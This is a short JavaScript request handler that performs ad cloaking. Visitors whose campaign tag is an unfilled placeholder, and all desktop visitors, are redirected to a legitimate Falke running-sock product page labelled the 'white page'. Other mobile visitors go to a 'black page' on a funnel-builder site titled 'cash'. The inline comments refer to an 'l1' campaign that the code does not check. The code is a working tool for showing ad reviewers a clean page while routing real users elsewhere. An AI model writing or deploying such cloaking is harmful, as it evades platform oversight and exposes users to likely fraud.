export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.falke.com/us_en/p/ru4-endurance-cool-short-men-running-short-socks/16170_8018/?trackingtoken=Category_Page%7Coutput1%7CA%7Cdefault_campaigns%7Ccategory%20to%20topseller(clicks)%7CC2T_sale";
    const blackPageURL = "https://VXAJXfDwZd.myfunnelish.com/cash-1735686017557538";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
